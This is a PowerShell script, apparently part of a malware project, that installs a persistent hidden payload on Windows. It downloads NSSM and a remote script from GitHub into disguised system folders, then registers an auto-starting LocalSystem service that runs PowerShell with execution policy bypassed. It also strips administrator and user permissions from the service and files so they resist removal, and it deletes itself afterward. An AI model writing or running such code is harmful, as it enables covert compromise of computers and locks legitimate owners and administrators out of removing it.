# script must run as admin/SYSTEM
param(
    [string]$rootPath,
    [string]$scriptPath,
    [string]$basePath
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls"
)
$curr = $MyInvocation.MyCommand.Path
$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
if($arch -eq "64-bit"){
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
}else{
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
}

$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$propertyName = "rootMon"

if(($scriptPath -eq $null) -or ($scriptPath -eq "")){
    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    $scriptPath = $paths[$idx]
    $scriptPath = "$scriptPath\root_mon.ps1"
    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $scriptPath -Force | Out-Null
}

if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

$serviceName = "MyRootMonService"
$exePath = "powershell.exe"
$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath'"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    iwr -Uri $nssmUrl -OutFile $nssmexe
}

if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $scriptPath
}


if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\root_mon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\root_mon_srv.log.error"
& $nssmexe start $serviceName

Start-Sleep -Seconds 3
$user = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $scriptPath 
icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /Q 
icacls $scriptPath /inheritance:r /Q 
icacls $scriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /Q 
icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
icacls $scriptPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
icacls $scriptPath /remove "$user" /Q 


takeown /F $nssmFolder /R /D Y 
icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 
icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 
icacls $nssmFolder /inheritance:r /T /Q 
icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 
icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 
icacls $nssmFolder /remove "$user" /T /Q 



#attrib +h +s +r $nssmFolder 2>&1 | Out-Null
#attrib +h +s +r $scriptPath

Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue